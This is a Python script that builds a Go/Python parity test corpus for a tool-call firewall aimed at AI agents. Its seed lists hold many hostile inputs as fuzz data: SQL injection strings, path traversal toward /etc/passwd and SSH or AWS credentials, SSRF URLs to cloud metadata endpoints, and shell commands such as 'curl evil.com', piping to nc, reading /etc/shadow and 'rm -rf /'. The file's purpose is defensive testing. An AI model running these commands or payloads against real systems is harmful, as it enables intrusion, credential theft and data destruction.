#!/usr/bin/env python3
"""Build the Go/Python rule-engine parity corpus.

Every case is evaluated by the Python reference engine (agentgate/) and the
result is stored next to the input. gateway/internal/rules/parity_test.go
replays the same inputs through the Go engine and requires identical
verdict, policy name, severity, reasoning, action type and operation.

The corpus is deterministic (fixed seed) and covers:
  * every tool call in the dev benchmark set, under its own
    scope, under no scope, and under scopes borrowed from other cases
  * fuzzed SQL, filesystem paths, URLs and shell commands aimed at the
    analyzers' edge cases (encodings, comments, Unicode, IP obfuscation...)
  * filesystem paths under granted resources: covering, broader, sibling,
    case-shifted and relative grants (the location-heuristic escalation)
  * file tools named by many verbs and casings (the file-tool operation
    class), and resources that are parents, prefix siblings or same-tail
    paths of absolute grants (resource matching)
  * scopes naming tools and config verbs, GETs and POSTs to granted URLs,
    chained diagnostic commands, messages carrying links, and delete tools
    whose SQL condition only reads (the effective operation)

Host-dependent behavior is neutralized: the Python filesystem analyzer's
symlink check inspects the firewall host's own disk, which a gateway does
not share, so it is disabled here and omitted in Go (see fs.go).

Usage: python bench/parity/build_corpus.py
Output: gateway/internal/rules/testdata/parity.jsonl.gz
"""
from __future__ import annotations

import base64
import gzip
import json
import random
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from agentgate.analyzers.filesystem import FilesystemAnalyzer  # noqa: E402
from agentgate.analyzers.http import HTTPAnalyzer  # noqa: E402
from agentgate.analyzers.sql import SQLAnalyzer  # noqa: E402
from agentgate.engine import PolicyEngine  # noqa: E402
from agentgate.models import ScopePolicy, ToolCall  # noqa: E402

FilesystemAnalyzer._check_symlink_escape = lambda self, path: None  # host-dependent

OUT = ROOT / "gateway" / "internal" / "rules" / "testdata" / "parity.jsonl.gz"
rng = random.Random(20261104)

SQL = SQLAnalyzer()
FS = FilesystemAnalyzer()
HTTP = HTTPAnalyzer()


def engine_case(tool_name: str, arguments: dict, scope: dict | None) -> dict:
    eng = PolicyEngine(
        scope=ScopePolicy(
            task=scope.get("task", ""),
            allowed_operations=scope.get("allowed_operations", []),
            allowed_resources=scope.get("allowed_resources", []),
            deny_operations=scope.get("deny_operations", []),
        ) if scope is not None else None,
        rate_limit=10**9,
    )
    tc = ToolCall(tool_name=tool_name, arguments=arguments)
    try:
        v = eng.evaluate(tc)
        expect = {
            "verdict": v.action.value, "policy": v.policy_name, "severity": v.severity.value,
            "reasoning": v.reasoning, "action_type": tc.action_type.value,
            "operation": eng._operation(tc),
        }
    except Exception as e:  # the Go engine must BLOCK where Python raises
        expect = {"error": type(e).__name__}
    return {"kind": "engine", "tool_name": tool_name, "arguments": arguments, "scope": scope, "expect": expect}


def analyzer_result(r) -> dict:
    return {"verdict": r.verdict.value, "severity": r.severity.value, "reasoning": r.reasoning}


# ---------------------------------------------------------------- seeds

def load_steps() -> list[tuple[str, dict, dict]]:
    out = []
    for name in ("dev_set.jsonl",):
        for line in (ROOT / "bench" / "data" / name).read_text().splitlines():
            case = json.loads(line)
            scope = dict(case["scope"])
            scope["task"] = case["task"]
            for st in case["steps"]:
                out.append((st["tool_name"], st["arguments"], scope))
    return out


SQL_SEEDS = [
    "SELECT * FROM users", "select id from orders where total > 100", "DROP TABLE users",
    "DELETE FROM sessions WHERE expires < now()", "UPDATE users SET role='admin' WHERE id=1",
    "INSERT INTO audit_log (event) VALUES ('x')", "TRUNCATE TABLE logs", "ALTER TABLE users ADD c int",
    "GRANT ALL ON users TO bob", "REVOKE SELECT ON t FROM bob", "SELECT 'DROP TABLE x' AS c",
    "SELECT * FROM a UNION SELECT password FROM admin", "SELECT * FROM t; DROP TABLE t",
    "EXEC xp_cmdshell 'dir'", "EXEC('SELECT 1')", "DECLARE @x int; SELECT @x",
    "SELECT LOAD_FILE('/etc/passwd')", "SELECT * INTO OUTFILE '/tmp/x' FROM users",
    "SELECT * FROM information_schema.tables", "SELECT table_name FROM information_schema.columns UNION SELECT 1",
    "SELECT @@version", "SELECT * FROM sys.objects", "SELECT * FROM mysql.user",
    "WITH recent AS (SELECT * FROM orders) SELECT * FROM recent",
    "WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a JOIN b ON 1=1",
    "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t) SELECT n FROM t",
    "WITH x AS (SELECT 1) INSERT INTO y SELECT * FROM x",
    "CREATE OR REPLACE VIEW v AS SELECT * FROM users", "CREATE TABLE t (id int)",
    "REFRESH MATERIALIZED VIEW sales_mv", "EXPLAIN SELECT * FROM orders", "SHOW TABLES",
    "DESCRIBE users", "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
    "REPLACE INTO t VALUES (1)", "UPSERT INTO t VALUES (1)", "select(1)", "SELECT t.update FROM t",
    "SELECT * FROM `users`", "SELECT * FROM [dbo].[users]", "SELECT * FROM \"Users\"",
    "SELECT * FROM public.orders o JOIN public.order_lines l ON o.id=l.order_id",
    "admin'--", "1; DROP TABLE users", "' OR '1'='1", "0x44524f50205441424c45207573657273",
    "SELECT/**/password/**/FROM/**/users", "DR/**/OP TABLE users", "DROP%20TABLE%20users",
    "SELECT * FROM users WHERE name = '%27'", "SELECT \\x44ROP", "SELECT 1.5e3, 1., .5, 123abc FROM t",
    "SELECT $tag$DROP TABLE x$tag$", "SELECT * FROM t WHERE a := 1", "SELECT * FROM t -- DROP TABLE t",
    "SELECT * FROM t # comment\n", "/*+ hint */ SELECT * FROM t", "BEGIN; DELETE FROM t; COMMIT;",
    "CREATE FUNCTION f() BEGIN SELECT 1; END", "SELECT CASE WHEN a THEN b END FROM t",
    "SELECT count(*) FROM orders GROUP BY status ORDER BY 1 DESC NULLS LAST",
    "SELECT * FROM t LEFT OUTER JOIN u USING (id)", "GO 2", "SELECT * FROM t;GO",
    "SELECT name FROM tablé", "SELECT * FROM éFROM", "SELECT\u00a0*\u00a0FROM users",
    "DROP\u000bTABLE users", "DROP\u00a0TABLE users", "SELECT * FROM ｕｓｅｒｓ",
    "  ", "", "SELECT", "users WHERE 1=1", "123; SELECT 1", "(SELECT 1)", "SELECT * FROM t WHERE x IN (1,2)",
    "SELECT * INTO TEMP t2 FROM t", "SELECT a FROM b WHERE c = @d", "SELECT ':name', ? FROM t",
    "SELECT %(name)s FROM t", "SELECT * FROM t WHERE j->>'a' = 'b'", "SELECT x::int FROM t",
]

SQL_WORDS = ["SELECT", "select", "FROM", "from", "WHERE", "DROP", "TABLE", "DELETE", "INSERT", "INTO",
             "UPDATE", "SET", "UNION", "ALL", "WITH", "AS", "JOIN", "users", "orders", "admin_credentials",
             "sales", "t", "x.y", "`q`", "'lit'", "\"sym\"", "(", ")", ";", ",", "*", "=", "1", "0x1F",
             "/*c*/", "-- c\n", "\n", "\t", "  ", "EXEC", "DECLARE", "@v", "@@ver", "information_schema",
             "CREATE", "OR", "REPLACE", "VIEW", "BEGIN", "END", "CASE", "WHEN", "THEN", "GRANT", "REVOKE",
             "TRUNCATE", "ALTER", "MERGE", "EXPLAIN", "SHOW", "DESCRIBE", "REFRESH", "1.5", "$$x$$", "é", "_t"]


def mutate_sql(s: str) -> str:
    ops = [
        lambda x: x.upper(), lambda x: x.lower(), lambda x: x.swapcase(),
        lambda x: x.replace(" ", "/**/"), lambda x: x.replace(" ", "\t"), lambda x: x.replace(" ", "\n"),
        lambda x: x.replace(" ", "\u00a0"), lambda x: x + ";", lambda x: x + "; SELECT 1",
        lambda x: urllib.parse.quote(x), lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        lambda x: "WITH c AS (" + x + ") SELECT * FROM c", lambda x: "  " + x + "  ",
        lambda x: x.replace("O", "%4F"), lambda x: x.replace("E", "\\x45"), lambda x: x + " -- tail",
        lambda x: "/* lead */ " + x, lambda x: x.replace("FROM", "FROM\u00e9"),
    ]
    for _ in range(rng.randint(1, 3)):
        s = rng.choice(ops)(s)
    return s


def random_sql() -> str:
    return " ".join(rng.choice(SQL_WORDS) for _ in range(rng.randint(1, 14)))


CTE_MAIN = ["SELECT * FROM c", "INSERT INTO t SELECT * FROM c", "UPDATE t SET a = 1", "MERGE INTO t USING c ON 1=1",
            "DELETE FROM t USING c", "SELECT a, b FROM c JOIN d ON c.id = d.id", "REPLACE INTO t SELECT * FROM c"]


def with_sql() -> str:
    """WITH statements: realistic CTE shapes, then token soup after WITH."""
    if rng.random() < 0.5:
        n = rng.randint(1, 3)
        defs = []
        for i in range(n):
            name = rng.choice(["c", "recent", "`q`", '"Sym"', "x_1", "t2(a, b)"])
            body = rng.choice(["SELECT 1", "SELECT * FROM orders", "SELECT id FROM users WHERE x = 'a'",
                               "UPDATE t SET a = 1 RETURNING *", "SELECT 1 UNION ALL SELECT 2"])
            defs.append(f"{name} AS ({body})")
        rec = rng.choice(["", "RECURSIVE "])
        sep = rng.choice([", ", ",\n", " , "])
        tail = rng.choice(["", " /* c */", "\n"])
        return f"WITH {rec}{sep.join(defs)}{tail} {rng.choice(CTE_MAIN)}"
    return "WITH " + random_sql()


PATH_SEEDS = [
    "/etc/passwd", "../../etc/passwd", "..\\..\\windows\\win.ini", "/app/data/report.csv", "reports/q4.pdf",
    "/var/log/syslog", "/home/user/.ssh/id_rsa", ".env", "/app/.env", "config.yaml", "/srv/app/config.php",
    "C:\\Windows\\System32\\drivers\\etc\\hosts", "c:WINDOWS", "/tmp/output.txt", "/", ".", "./",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%252e%252e%252fetc", "..%c0%afetc/passwd", "%c0%ae%c0%ae/etc",
    "/etc/passwd%00.png", "/data\x00/x", "／ｅｔｃ／ｐａｓｓｗｄ", "‥/‥/etc", "/backup/db.sql", "/app/backups/x",
    "/home/u/.aws/credentials", "server.key", "cert.pem", "my_secret_notes.txt", "api-key.txt", "/proc/self/environ",
    base64.b64encode(b"/etc/passwd").decode(), base64.b64encode(b"../../secret").decode(), "L2V0Yy9zaGFkb3c=",
    "/var/www/html/index.php", "/app/logs/app.log", "uploads/*.tmp", "/data/tmp", "/data/archive/old",
    "/app/settings.php", "install.php", "/srv/www/phpinfo.php", "~/.bash_history", "/root/.profile",
    "//etc/passwd", "/./etc/./passwd", "/app/../etc/passwd", "reports/../../x", "%2", "%zz", "% 1", "%+1a",
    "/data/report.final", ".hidden", "/data/..", "..", "a/b/c/", "\\\\server\\share\\file", "/private/etc/hosts",
    "/var/log/app/2024-06-20.log", "/var/log/app/access.log", "/etc/app/config.yaml", "/etc/app/secrets.yaml",
    "/backups/db/backup_2022.sql", "/dev/test_runs/out.txt", "/var/log/app/../../../etc/shadow", "/var/log/app/old",
    "/var/logs/app/x.log", "/etc/app/*.conf", "/etc/app/.env", "/var/log/app/%2e%2e/x.log", "/etc/app/nginx.conf",
    "/var/log/app/./debug.log", "/srv/backups/../../etc/x.conf", "/etc/app/server.key", "/var/log/app/messages",
]


def grants_for(p: str) -> list[str]:
    """Scope grants around *p*: its own prefixes, the root, system dirs, look-alikes."""
    parts = p.split("/")
    prefix = "/".join(parts[: rng.randint(0, len(parts))])
    return rng.choice([
        [], [prefix], [prefix + "/"], [p], ["/"], ["/etc/", "/var/log/"], [prefix.upper()],
        ["reports", prefix], [prefix + "x"], [" " + prefix], ["/var/log/app/", "/etc/app", "/backups/db/"],
    ])


def mutate_path(p: str) -> str:
    ops = [
        lambda x: urllib.parse.quote(x, safe=""), lambda x: x.replace("/", "%2f"), lambda x: x.replace(".", "%2e"),
        lambda x: x.replace("/", "\\"), lambda x: x.upper(), lambda x: x + "%00", lambda x: "/app/" + x,
        lambda x: x.replace("/", "//"), lambda x: " " + x + " ", lambda x: x.replace(".", "\uff0e"),
        lambda x: x.replace("/", "%c0%af"), lambda x: base64.b64encode(x.encode()).decode(),
        lambda x: x + "/", lambda x: "../" + x, lambda x: x.replace("e", "%65"),
    ]
    for _ in range(rng.randint(1, 2)):
        p = rng.choice(ops)(p)
    return p


GRANTED_URLS = ["https://docs.company.com/api", "https://docs.company.com/api/v2/x", "https://docs.company.com",
                "https://docs.company.com/apix", "http://169.254.169.254/latest/meta-data/",
                "https://docs.company.com/api?page=2", "https://docs.company.com/api#top",
                "https://docs.company.com.evil.net/api", "https://docs.company.com@evil.net/api",
                "HTTPS://DOCS.COMPANY.COM/API", "https://docs.company.com:8443/api"]

URL_SEEDS = [
    "https://api.example.com/v1/data", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin",
    "http://127.0.0.1/", "http://127.1/", "http://0x7f000001/", "http://2130706433/", "http://017700000001/",
    "http://0177.0.0.1/", "http://[::1]/", "http://[::ffff:169.254.169.254]/", "http://[::ffff:a9fe:a9fe]/",
    "http://[fd00:ec2::254]/", "http://10.0.0.5/internal", "http://192.168.1.1/", "http://172.16.0.1/",
    "http://metadata.google.internal/computeMetadata/v1/", "http://metadata/", "file:///etc/passwd",
    "gopher://evil.com:70/", "ftp://files.example.com/x", "dict://localhost:11211/", "http://evil.nip.io/",
    "http://a@b@c.com/", "http://user:pass@internal.corp/", "http://x\\@evil.com/", "http://${HOST}/api",
    "http://$INTERNAL_HOST/", "http://①②⑦.0.0.1/", "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/", "http://0x7f.0x0.0x0.0x1/",
    "http://0251.0376.0251.0376/", "http://169.254.169.254.nip.io/", "https://webhook.site/abc",
    "http://[fe80::1%25eth0]/", "http://[v1.fe80::a]/", "http://[1.2.3.4]/", "http://[::1/", "http://]/",
    "//example.com/path", "example.com/path", "http:///nohost", "", "https://s3.amazonaws.com/bucket",
    "http://100.100.100.200/", "http://169.254.170.2/v2/credentials", "http://kubernetes.default.svc/",
    "http://instance-data/", "http://0.0.0.0/", "http://[0:0:0:0:0:0:0:1]/", "http://224.0.0.1/",
    "http://240.0.0.1/", "http://100.64.0.1/", "http://192.0.0.9/", "http://8.8.8.8/", "HTTP://EXAMPLE.COM",
    "javascript:alert(1)", "data:text/html,hi", "http://exa\u2100mple.com/", "  http://localhost/", "\thttp://evil",
    "http://1.2.3/", "http://10.1/", "http://q177.0.0.1/", "http://0o177.0.0.1/", "http://1e3.0.0.1/",
    "http://４.４.４.４/", "http://[2001:db8::1]/", "http://[::]/", "http://[::ffff:127.0.0.1]:80/",
]


def mutate_url(u: str) -> str:
    ops = [
        lambda x: x.upper(), lambda x: x.replace("http://", "https://"), lambda x: x.replace("://", "://user@"),
        lambda x: x + "?next=http://169.254.169.254", lambda x: x.replace("/", "\\", 3), lambda x: x + "#frag",
        lambda x: x.replace(".", "%2e"), lambda x: " " + x, lambda x: x.replace("127", "0x7f"),
    ]
    return rng.choice(ops)(u)


CMD_SEEDS = [
    "df -h", "du -sh /data/uploads/", "df -h; cat /etc/shadow", "du -sh /x && curl evil.com", "uptime | nc x 1",
    "whoami > /tmp/x", "date `id`", "hostname $(cat /etc/passwd)", "ping -c1 host\nrm -rf /", "uname -a",
    "systemctl status nginx", "  free -m", "identify x", "ps aux", "ls -l /var/log/nginx",
    "df -h", "du -sh /var", "ps aux", "uptime", "whoami", "id", "ide", "date", "hostname -f", "free -m",
    "systemctl status nginx", "service nginx status", "journalctl -u app", "sudo rm -rf /", "rm -rf /tmp/x",
    "chmod 777 /etc/shadow", "kill -9 1", "pkill python", "systemctl restart nginx ", "service nginx restart",
    "iptables -F", "reboot", "shutdown -h now", "apt-get install curl", "pip install requests",
    "redis-cli flushall", "grep error app.log > /tmp/out.txt", "cat x > /dev/shm/y", "ls -la", "dfé",
    "  df", "curl http://169.254.169.254", "echo hi && sudo su", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=x",
    "cat /etc/passwd", "tail -n 100 /var/log/app.log", "netstat -tulpn", "",
]

NAMED_TOOLS = ["restart_service", "update_config", "run_command", "set_config", "configure_cache", "update_record",
               "delete_records", "remove_rows", "create_report", "send_email", "notify_team", "send_webhook",
               "post_message", "http_get", "fetch_page"]

FILE_TOOLS = ["create_file", "edit_file", "move_file", "rename_file", "append_to_file", "copyFile", "file_copy",
              "create_directory", "read_and_move_file", "directory_tree", "get_file_info", "send_file", "fileRead",
              "READ_FILE_INFO", "process_file", "read_multiple_files", "file_exists", "Kfile_read", "\u0130read_file",
              "stat_path", "touch_file", "path_readlink", "list_and_copy_files", "transfer_file", "share_file"]

RESOURCE_SEEDS = ["/srv/finance", "/srv", "srv", "/srv/finance/reports_old", "reports", "finance/reports", "/reports",
                  "/srv/finance/reports/q4.pdf", "/home/alice/notes.txt.bak", "/home/alice/notes.txt", "application_logs/x",
                  "https://api.example.com", "https://api.example.com/v1/data/x", "orders_2024", "sales", "sales_2024",
                  " /srv/finance/reports/x ", "/SRV/finance/reports/x", "/backup/srv/finance/reports", "/app", "app/x",
                  "/app/x", "//srv//finance//reports", "\\srv\\finance"]

TOOL_NAMES = NAMED_TOOLS + FILE_TOOLS + ["execute_sql", "run_query", "query_database", "read_file", "write_file", "delete_file",
              "list_directory", "search_files", "http_request", "fetch_url", "send_email", "send_notification",
              "post_message", "forward_message", "read_inbox", "run_command", "execute_command", "shell_exec",
              "read_logs", "read_metrics", "update_config", "deploy_service", "restart_service", "export_data",
              "delete_records", "create_user", "create_shell_command", "get_status", "frobnicate", "upload_file",
              "sync_bucket", "db_feedback", "offsets_tool", "bash", "curl_it",
              # tool-verb edge cases: camelCase, hyphens, all caps, no leading letter
              "deleteFile", "remove-file", "LIST_FILES", "_hidden_tool", "clear_cache", "stop_service",
              "broadcast_alert", "upload_report", "list_and_delete_files", "search_logs"]

SCOPES = [
    None,
    {"task": "t", "allowed_operations": [], "allowed_resources": []},
    {"task": "Report on sales", "allowed_operations": ["read"], "allowed_resources": ["sales", "orders"]},
    {"task": "Ops", "allowed_operations": ["read", "write", "execute"], "allowed_resources": ["/app/data", "logs"]},
    {"task": "Comms", "allowed_operations": ["send", "read"], "allowed_resources": ["team@company.com", "#ops"]},
    {"task": "Deploy", "allowed_operations": ["deploy", "read"], "allowed_resources": ["api-service"],
     "deny_operations": ["delete"]},
    {"task": "All", "allowed_operations": ["read", "write", "destructive", "execute", "send", "export", "config", "http"],
     "allowed_resources": []},
    {"task": "Verbs", "allowed_operations": ["delete", "list", "search", "restart", "forward", "export", "upload",
                                             "clear", "run", "fetch"], "allowed_resources": []},
    {"task": "Denied verbs", "allowed_operations": ["read", "write", "send", "deploy"], "allowed_resources": [],
     "deny_operations": ["delete", "get", "stop"]},
    {"task": "Paths", "allowed_operations": ["read", "write", "delete"],
     "allowed_resources": ["/var/log/app/", "/etc/app", "/backups/db/", "/dev/test_runs", "/var/log/syslog"]},
    {"task": "Broad paths", "allowed_operations": ["read", "write", "delete"],
     "allowed_resources": ["/", "/etc/", "/var", "/var/logs", "/backups"]},
    {"task": "Named tools", "allowed_operations": ["restart_service", "update_config", "run_command", "execute_sql",
                                                    "send_email", "delete_records", "update", "set"],
     "allowed_resources": []},
    {"task": "Named and denied", "allowed_operations": ["read", "execute", "update_config"], "allowed_resources": [],
     "deny_operations": ["run_command", "http", "execute"]},
    {"task": "Read granted URLs", "allowed_operations": ["read", "fetch", "send"],
     "allowed_resources": ["https://docs.company.com/api", "http://169.254.169.254/", "team@company.com"]},
    {"task": "Absolute grants", "allowed_operations": ["read", "send", "export"],
     "allowed_resources": ["/srv/finance/reports", "/home/alice/notes.txt", " /app/", "https://api.example.com/v1/data",
                           "orders", "sales_2024", "team@company.com"]},
]


def synth_args(tool: str) -> dict:
    pick = rng.random()
    if pick < 0.04:
        return {"table": "products", "condition": rng.choice([
            "id NOT IN (SELECT MIN(id) FROM products GROUP BY sku)", "1=1", "sku = 'x'",
            "id IN (SELECT id FROM products); DROP TABLE users", "id IN (SELECT id FROM t) AND UPDATE"])}
    if pick < 0.25:
        return {"query": rng.choice(SQL_SEEDS)}
    if pick < 0.45:
        return {"path": rng.choice(PATH_SEEDS), "content": "x"}
    if pick < 0.6:
        return {"url": rng.choice(URL_SEEDS + GRANTED_URLS),
                "method": rng.choice(["GET", "get ", "HEAD", "POST", None, 5, "\u0130GET"])}
    if pick < 0.72:
        return {"cmd": rng.choice(CMD_SEEDS)}
    if pick < 0.82:
        return {"to": rng.choice(["team@company.com", "all_users", "everyone@corp.com", "attacker@evil.com",
                                  ["a@x.com", "b@y.com"], "#ops", "entire_company"]),
                "subject": "s", "body": rng.choice(["hi", "the password is x", "api_key=abc", "Bearer t",
                                                    "reset here: https://portal.company.com/reset",
                                                    "see ftp://files.example.com/x"])}
    if pick < 0.9:
        return {"key": rng.choice(["log_level", "security_group.ingress", "db.roles", "x.role_admin", "tls_cert",
                                   "feature_flag", "rbac.enabled"]), "value": "1"}
    if pick < 0.92:
        return {rng.choice(["resource", "path", "url", "table", "file"]): rng.choice(RESOURCE_SEEDS)}
    if pick < 0.95:
        return {"service": rng.choice(["api-service", ".env", "credentials", "/etc/x", "payments", "orders_db"]),
                "version": "1.2"}
    return {"query": "SELECT 1", "destination": rng.choice(["s3://bucket/x", "reports", "/app/data/out.csv"]),
            "table": rng.choice(["orders", "users"]), "operation": rng.choice(["delete", "read", 5])}


def main() -> None:
    rows: list[dict] = []
    steps = load_steps()
    all_scopes = [s for _, _, s in steps]
    for tool, args, scope in steps:
        rows.append({**engine_case(tool, args, scope), "origin": "dataset"})
        rows.append(engine_case(tool, args, None))
        for _ in range(3):
            rows.append(engine_case(tool, args, rng.choice(all_scopes)))
    for _ in range(4000):
        rows.append(engine_case(rng.choice(TOOL_NAMES), synth_args(""), rng.choice(SCOPES)))

    dataset_sqls = [st[1].get("query") for st in steps if isinstance(st[1].get("query"), str)]
    for q in dataset_sqls:
        rows.append({"kind": "sql", "origin": "dataset", "input": q, "expect": analyzer_result(SQL.analyze(q))})
        rows.append({"kind": "tables", "origin": "dataset", "input": q, "expect": {"tables": SQL.extract_tables(q)}})
    sqls = list(SQL_SEEDS)
    sqls += [mutate_sql(rng.choice(SQL_SEEDS)) for _ in range(4000)]
    sqls += [random_sql() for _ in range(4000)]
    sqls += [with_sql() for _ in range(3000)]
    for q in sqls:
        rows.append({"kind": "sql", "input": q, "expect": analyzer_result(SQL.analyze(q))})
        rows.append({"kind": "tables", "input": q, "expect": {"tables": SQL.extract_tables(q)}})

    for _, args, scope in steps:
        p = args.get("path")
        if not isinstance(p, str):
            continue
        for op in ("read", "write", "delete"):
            for granted in ([], scope.get("allowed_resources", [])):
                rows.append({"kind": "fs", "origin": "dataset", "input": p, "operation": op, "granted": granted,
                             "expect": analyzer_result(FS.analyze(p, op, granted))})
    paths = list(PATH_SEEDS)
    paths += [mutate_path(rng.choice(PATH_SEEDS)) for _ in range(4000)]
    for p in paths:
        for op in ("read", "write", "delete", "execute"):
            granted = grants_for(p)
            rows.append({"kind": "fs", "input": p, "operation": op, "granted": granted,
                         "expect": analyzer_result(FS.analyze(p, op, granted))})

    for u in [st[1].get("url") for st in steps if isinstance(st[1].get("url"), str)]:
        rows.append({"kind": "http", "origin": "dataset", "input": u, "expect": analyzer_result(HTTP.analyze(u))})
    urls = list(URL_SEEDS)
    urls += [mutate_url(rng.choice(URL_SEEDS)) for _ in range(3000)]
    for u in urls:
        rows.append({"kind": "http", "input": u, "expect": analyzer_result(HTTP.analyze(u))})

    OUT.parent.mkdir(parents=True, exist_ok=True)
    with gzip.open(OUT, "wt", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    kinds: dict[str, int] = {}
    for r in rows:
        kinds[r["kind"]] = kinds.get(r["kind"], 0) + 1
    print(f"wrote {len(rows)} parity cases {kinds} -> {OUT.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
